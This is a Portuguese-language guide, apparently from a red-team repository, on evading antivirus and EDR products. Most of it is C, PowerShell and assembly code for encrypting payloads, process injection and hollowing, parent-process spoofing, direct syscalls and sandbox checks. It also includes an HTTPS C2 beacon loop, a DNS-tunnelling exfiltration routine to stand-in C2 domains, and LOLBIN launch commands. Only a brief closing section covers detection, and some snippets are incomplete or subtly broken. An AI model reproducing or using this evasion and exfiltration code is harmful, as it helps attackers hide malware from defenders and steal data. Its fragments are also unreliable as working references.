# 🛡️ AV/EDR Bypass Techniques

Documentação de **técnicas defensivas** e **detecção de evasão** para testes de segurança autorizado.

Este guia explora como adversários contornam proteções, para fins educacionais, pesquisa e red team autorizado.

---

## ⚠️ Importante

Este conteúdo é **estritamente para fins educacionais**:
- ✅ Red Team exercises autorizados
- ✅ Pesquisa de segurança
- ✅ Melhorar capacidades defensivas
- ❌ Atividades maliciosas não autorizadas

---

## 📋 Índice

- [Conceitos Fundamentais](#conceitos-fundamentais)
- [Técnicas de Evasão de Assinatura](#técnicas-de-evasão-de-assinatura)
- [Evasão Comportamental](#evasão-comportamental)
- [Evasão de Memória](#evasão-de-memória)
- [Evasão de Network/C2](#evasão-de-networkc2)
- [Técnicas Avançadas](#técnicas-avançadas)
- [Detecção de EDR](#detecção-de-edr)
- [Contramedidas](#contramedidas)

---

## 🔍 Conceitos Fundamentais

### Tipos de Detecção

#### 1. Detecção por Assinatura
- **O quê:** Pattern matching em arquivos (hashes, strings)
- **Como funciona:** AV compara arquivo contra base de assinaturas conhecidas
- **Evasão:** Modificar arquivo para não matchear assinatura
- **Detecção:** Rápida, mas fácil de contornar com polimorfismo

#### 2. Detecção Heurística
- **O quê:** Análise comportamental estática
- **Como funciona:** Procura por padrões suspeitos no código (APIs perigosas, etc)
- **Evasão:** Ofuscar código, usar técnicas legítimas
- **Detecção:** Mais efetivo que assinatura, mas ainda evitável

#### 3. Detecção Comportamental (EDR)
- **O qué:** Monitor de atividades em tempo real
- **Como funciona:** Kernel driver monitora syscalls, file ops, network
- **Evasão:** Mais difícil; requer técnicas sofisticadas
- **Detecção:** Estado-da-arte em proteção

---

## 🔐 Técnicas de Evasão de Assinatura

### 1. Encoding & Encryption

#### Polimorphic Encoding
```python
# Shellcode encriptado dinamicamente
import base64
import os

shellcode = b"\x90\x90\xCC"  # NOP sled + breakpoint
key = os.urandom(16)

# Encriptar com XOR
encrypted = bytes([shellcode[i] ^ key[i % len(key)] for i in range(len(shellcode))])

print(f"Encrypted: {base64.b64encode(encrypted)}")

# Decoder stub (C):
/*
BYTE encrypted[] = {...};
BYTE key[] = {...};
for (int i = 0; i < sizeof(encrypted); i++) {
    encrypted[i] ^= key[i % 16];
}
// Execute encrypted payload
*/
```

#### AES Encryption
```c
// Encriptar payload com AES-256
#include <openssl/aes.h>

unsigned char key[32] = {...};
unsigned char iv[16] = {...};
unsigned char encrypted_payload[PAYLOAD_SIZE] = {...};

AES_KEY decrypt_key;
AES_set_decrypt_key(key, 256, &decrypt_key);
AES_cbc_encrypt(encrypted_payload, plaintext, PAYLOAD_SIZE, &decrypt_key, iv, AES_DECRYPT);

// Executar plaintext
```

### 2. Obfuscation & Code Transformation

#### Dead Code Injection
```c
// Adicionar código inócuo para aumentar tamanho e confundir pattern matching
void BeaconCallback() {
    // Código malicioso
    CreateProcessA("cmd.exe", ...);
    
    // Código inócuo (dead code)
    printf("Hello, World!");
    int x = 5 + 3;
    Sleep(1000);
    // EDR vê muito código, difícil detectar padrão
}
```

#### String Obfuscation
```c
// APIs perigosas como strings ofuscadas
LPSTR ObfuscatedString(const char* str) {
    unsigned char decoded[256] = {0};
    // ROT-13 ou XOR decode
    for (int i = 0; str[i]; i++) {
        decoded[i] = str[i] ^ 0xFF;
    }
    return (LPSTR)decoded;
}

// Uso
HMODULE kernel32 = GetModuleHandleA("kernel32");
FARPROC CreateProcess = GetProcAddress(kernel32, ObfuscatedString("CreateProcessA"));
```

#### Control Flow Flattening
```c
// Transformar estruturas de controle para dificultar análise
// IF-ELSE → switch com computed GOTO
switch(state) {
    case 0: /* snippet 1 */ state = 2; break;
    case 2: /* snippet 2 */ state = 5; break;
    case 5: /* snippet 3 */ return;
}
```

### 3. File-less / Memory-only Execution

#### Reflexive DLL Injection
```c
// Carregar DLL em memória sem tocar disco
LPVOID ReflectiveLoad(HMODULE hModule) {
    // DLL já em memória, relocate e execute
    PE_IMAGE_NT_HEADERS* pNtHeaders = ...;
    // ...
}

// Use:
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
LPVOID pRemoteBuffer = VirtualAllocEx(hProcess, NULL, dllSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, pRemoteBuffer, dllBytes, dllSize, NULL);
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
```

#### PowerShell Reflection
```powershell
# Carregar .NET assembly dinamicamente sem disco
$bytes = [System.IO.File]::ReadAllBytes("beacon.exe")
[System.Reflection.Assembly]::Load($bytes)

# Ou via base64
$b64 = "TVqQAAMA..."
$bytes = [Convert]::FromBase64String($b64)
[System.Reflection.Assembly]::Load($bytes).GetType('Namespace.Class').GetMethod('Main').Invoke($null, $null)
```

#### Syscall Direct Invocation (Asm)
```asm
; Chamar NtOpenProcess sem passar por Win32 API (evita EDR hooks)
mov rax, [gs:0x60]        ; PEB
mov rax, [rax+0x18]       ; Ldr
mov rax, [rax+0x10]       ; InLoadOrderModuleList
lea rax, [rax+0x20]       ; Primeiro módulo
mov rax, [rax]            ; Próximo módulo
mov rax, [rax+0x20]       ; ntdll.dll

; Procurar NtOpenProcess na export table...
; ...chamar syscall direto
syscall
```

---

## 👁️ Evasão Comportamental

### 1. Process Injection & Hollowing

#### Process Hollowing (RunPE)
```c
// Criar processo suspenso, cavar out, injetar shellcode
STARTUPINFOA si = {0};
PROCESS_INFORMATION pi = {0};

// 1. Criar processo (ex: svchost.exe)
CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, 
               FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// 2. Obter context
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(pi.hThread, &ctx);

// 3. Ler PE headers do alvo e calcular nova entry point
LPVOID imageBase = (LPVOID)ctx.Rcx;
// ...ReadProcessMemory, parse PE...

// 4. Copiar shellcode para o espaco do processo
VirtualAllocEx(pi.hProcess, imageBase, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, imageBase, shellcode, shellcodeSize, NULL);

// 5. Update entry point
ctx.Rcx = (ULONGLONG)shellcodeAddress;
SetThreadContext(pi.hThread, &ctx);

// 6. Resume
ResumeThread(pi.hThread);
```

#### Parent Process Spoofing
```c
// Fazer beacon parecer filho de explorer.exe (evita comportamento suspeito)
STARTUPINFOEXA si = {0};
PROCESS_INFORMATION pi = {0};
SIZE_T cbAttributeListSize = 0;

InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
si.lpAttributeList = HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &cbAttributeListSize);

// Parent: explorer.exe
HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorerPID);
UpdateProcThreadAttribute(si.lpAttributeList, 0, 
                          PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, 
                          &hParent, sizeof(HANDLE), NULL, NULL);

si.StartupInfo.cb = sizeof(si);
CreateProcessA(NULL, "cmd.exe", NULL, NULL, FALSE, 
               EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, 
               (LPSTARTUPINFO)&si, &pi);
```

### 2. API Hooking Detection & Bypass

#### Detect Inline Hooks
```c
// Verificar se APIs foram hookeadas
PBYTE pApiAddr = (PBYTE)GetProcAddress(GetModuleHandle("kernel32"), "CreateProcessA");

// APIs legítimas começam com MOV RCX ... ou push RSP
// Hooks começam com JMP, MOV RAX, etc.
if (*pApiAddr == 0x48) {  // LEA/MOV instruction (normal)
    // Provavelmente não hookeada
} else if (*pApiAddr == 0xFF || *pApiAddr == 0x4C) {  // JMP/indirect call
    // Provavelmente hookeada
    return ERROR_HOOK_DETECTED;
}
```

#### Direct Syscall (Bypass Hooks)
```c
// Usar NTDLL functions direto via syscall, evitando detecção de Win32 API calls
typedef NTSTATUS (NTAPI *pNtCreateProcess)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ParentProcess,
    BOOLEAN InheritObjectTable,
    HANDLE SectionHandle,
    HANDLE DebugPort,
    HANDLE TokenHandle
);

// Declarar e usar
pNtCreateProcess NtCreateProcess = (pNtCreateProcess)GetProcAddress(GetModuleHandle("ntdll"), "NtCreateProcess");

// Ou via assembly syscall (evita tabela de import do DLL)
```

---

## 💾 Evasão de Memória

### 1. Encryption at Rest (Memory)

#### Runtime Encryption of Sensitive Code
```c
// Encriptar seção .text em memória quando não em uso
typedef struct {
    LPVOID pAddress;
    SIZE_T dwSize;
    LPVOID pKey;
} ENCRYPTED_SECTION;

void EncryptCodeSection() {
    LPVOID pCodeStart = (LPVOID)&FunctionToEncrypt;
    SIZE_T codeSize = 1024;
    
    // Encriptar com XOR
    for (SIZE_T i = 0; i < codeSize; i++) {
        ((PBYTE)pCodeStart)[i] ^= encryptionKey;
    }
}

void DecryptAndExecute() {
    // Descriptografar just-in-time
    EncryptCodeSection(); // XOR again = decrypt
    FunctionToEncrypt();
    EncryptCodeSection(); // Re-encrypt
}
```

### 2. Process Memory Scanning Evasion

#### Shellcode Fragmentation
```c
// Dividir shellcode em fragmentos separados para evitar detecção
// EDR procura por padrões de shellcode conhecidos
// Fragmentado, o padrão não é reconhecido

BYTE fragment1[] = {...};  // Primeiros 50 bytes
BYTE fragment2[] = {...};  // Próximos 50 bytes
BYTE fragment3[] = {...};  // Resto

// Executar em partes com obfuscation entre elas
ExecFragment(fragment1);
Sleep(100);
ExecFragment(fragment2);
// ...
```

### 3. Anti-Analysis Techniques

#### Debugger Detection
```c
// Se debugger está attached, sair sem fazer nada
if (IsDebuggerPresent()) {
    ExitProcess(0);
}

// Ou mais sutilmente, behave differently
BOOL bDebugger = FALSE;
CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebugger);

if (bDebugger) {
    // Desviar de atividades maliciosas
} else {
    // Executar payload
}
```

#### Sandbox Detection
```c
// Detectar sandboxes de segurança (Cuckoo, Joe, etc.)
// Essas VMs têm características únicas

// Procurar por DLLs específicas de sandbox
if (GetModuleHandle("sbiedll.dll")) {  // Sandboxie
    return ERROR_SANDBOX;
}

// Verificar username suspeito
char username[256];
GetEnvironmentVariable("USERNAME", username, 256);
if (strstr(username, "sandbox") || strstr(username, "virus")) {
    return ERROR_SANDBOX;
}
```

---

## 🌐 Evasão de Network/C2

### 1. C2 Traffic Obfuscation

#### HTTPS Beaconing with Jitter
```c
// Beacon que comunica via HTTPS com jitter para não parecer automatizado
#define JITTER_MIN 30
#define JITTER_MAX 300

void C2Beacon() {
    while (TRUE) {
        // Beacon com delay random
        int delay = JITTER_MIN + rand() % (JITTER_MAX - JITTER_MIN);
        Sleep(delay * 1000);
        
        // Requisição HTTPS normal (parecendo browser legítimo)
        HINTERNET hSession = InternetOpenA("Mozilla/5.0...", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        HINTERNET hConnect = InternetConnectA(hSession, "c2.domain.com", 443, NULL, NULL, 
                                               INTERNET_SCHEME_HTTPS, 0);
        HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", "/api/task", NULL, NULL, 
                                               0, INTERNET_FLAG_SECURE);
        
        HttpSendRequestA(hRequest, NULL, 0, NULL, 0);
        
        // Parse resposta (encrypted JSON)
        // Executar comando
        
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
    }
}
```

#### DNS Tunneling
```c
// Exfiltrar dados via DNS queries (muito discreto)
// nslookup exfiltrated_data.c2.com

void ExfiltrateViaDNS(const BYTE* data, SIZE_T size) {
    for (SIZE_T i = 0; i < size; i++) {
        char query[256];
        // Converter dados em hostname
        sprintf_s(query, sizeof(query), "%02x%02x%02x%02x.c2.com", 
                  data[i], data[i+1], data[i+2], data[i+3]);
        
        // Resolver (EDR verá apenas DNS query legítima)
        gethostbyname(query);
    }
}
```

### 2. Network Signature Evasion

#### HTTP/2 over TLS (Uncommon Traffic)
```c
// Usar HTTP/2 ao invés de HTTP/1.1
// Muitos IDS têm signatures apenas para HTTP/1.1
```

#### Legitimate Service Abuse
```c
// Usar serviços legítimos como C2 channel:
// - Microsoft Teams webhooks
// - Discord webhooks
// - Slack webhooks
// - Google Drive API

// Exemplo: Teams webhook
curl -X POST "https://outlook.webhook.office.com/..." \
  -H "Content-Type: application/json" \
  -d '{"text":"Command: whoami"}'
```

---

## 🎯 Técnicas Avançadas

### 1. Code Injection via COM Objects

```c
// Criar instância COM que executa código (evita processo visível)
IUnknown* pUnknown;
CLSID clsid;
CLSIDFromString(L"...", &clsid);

CoCreateInstance(clsid, NULL, CLSCTX_INPROC_SERVER, IID_IUnknown, (LPVOID*)&pUnknown);
// Explorar COM para executar código
```

### 2. LOLBIN (Living off the Land Binaries)

#### msiexec.exe
```cmd
msiexec /V /Z "beacon.msi"
```

#### regsvcs.exe
```cmd
regsvcs.exe beacon.dll
```

#### InstallUtil
```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe beacon.exe
```

---

## 🔴 Detecção de EDR

### Verificar se EDR está Instalado

#### Procurar por Processos EDR Conhecidos
```c
const char* edr_processes[] = {
    "MsMpEng.exe",      // Windows Defender
    "CrowdStrike",      // Falcon
    "MalwareBytesService",
    "TaniumClient",
    "SentinelAgent",
    NULL
};

for (int i = 0; edr_processes[i]; i++) {
    if (ProcessExists(edr_processes[i])) {
        printf("[!] EDR Detected: %s\n", edr_processes[i]);
        return ERROR_EDR_DETECTED;
    }
}
```

#### Detector via Registry
```c
// EDRs frequentemente criam chaves de registro específicas
HKEY hKey;
if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
    "SYSTEM\\CurrentControlSet\\Services\\WinDefend", 
    0, KEY_READ, &hKey) == ERROR_SUCCESS) {
    printf("[!] Windows Defender encontrado\n");
    RegCloseKey(hKey);
}
```

#### Detect via Loaded Drivers
```c
// Verificar drivers carregados
// EDRs frequentemente carregam drivers kernel
// Usar DriverQuery ou diretamente verificar \Device
```

---

## 🛡️ Contramedidas

### Para Defesores

#### Detectar Técnicas de Evasão

1. **Memory Scanning Avançado**
   - Scan por shellcode patterns (mesmo encriptado)
   - Behavioral monitoring (não depender apenas de assinatura)

2. **Behavioral Detection**
   - Detectar process injection (VirtualAllocEx + WriteProcessMemory)
   - Detectar syscall direto (monitorar registros de syscall)
   - Detectar thread creation anormal

3. **Fileless Execution Detection**
   - Monitor Win32 API calls anormais
   - PowerShell logging (ScriptBlock logging)
   - AMSI (Antimalware Scan Interface)

4. **Network Detection**
   - Monitor C2 traffic patterns (jitter suspeito, DNS queries anormais)
   - Analise de certificados SSL (self-signed?)
   - Detectar user-agents suspeitos

---

## 📚 Referências

- [MITRE ATT&CK - Defense Evasion](https://attack.mitre.org/tactics/TA0005/)
- [Outflank Blog - EDR Evasion](https://outflank.nl/blog/)
- [Frida - Dynamic Instrumentation](https://frida.re/)
- [Polaris Project - AV/EDR Testing](https://github.com/Azure/Polaris)

---

## ⚠️ Aviso Legal

Este conteúdo é **exclusivamente para fins educacionais**. Qualquer uso não autorizado é ilegal.

✅ Permitido:
- Red Team exercises autorizados
- Pesquisa de segurança acadêmica
- Melhorar defesa

❌ Proibido:
- Atividades maliciosas
- Acesso não autorizado
- Distribuição de malware
